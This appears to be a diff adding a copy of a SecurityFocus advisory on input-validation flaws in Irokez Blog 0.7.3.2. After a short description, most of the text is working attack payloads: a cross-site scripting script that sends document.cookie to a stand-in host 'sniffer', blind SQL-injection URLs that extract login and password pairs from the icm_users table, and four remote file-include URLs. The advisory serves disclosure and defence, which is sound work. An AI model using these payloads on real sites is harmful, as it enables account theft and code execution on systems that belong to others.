@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/33931/info
+
+Irokez Blog is prone to multiple input-validation vulnerabilities:
+
+- A cross-site scripting issue
+- An SQL-injection issue
+- Multiple remote file-include issues
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, execute arbitrary code, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Irokez Blog 0.7.3.2 is vulnerable; other versions may also be affected. 
+
+<script>img = new Image(); img.src = "http://sniffer/sniff.jpg?"+document.cookie;</script>
+http://www.example.com/blog/life/15' and ascii(substring((select concat(login,0x3a,pass) from icm_users limit 0,1),1,1)) between 100 and '115
+http://www.example.com/blog/life/15' and ascii(substring((select concat(login,0x3a,pass) from icm_users limit 0,1),1,1))='114
+
+http://www.example.com/modules/tml/block.tag.php?GLOBALS[PTH][classes]=[include]
+http://www.example.com/scripts/sitemap.scr.php?GLOBALS[PTH][classes]=[include]
+http://www.example.com/thumbnail.php?module=gallery&GLOBALS[PTH][classes]=[include]
+http://www.example.com/spaw/spaw_control.class.php?GLOBALS[spaw_root]=[include]
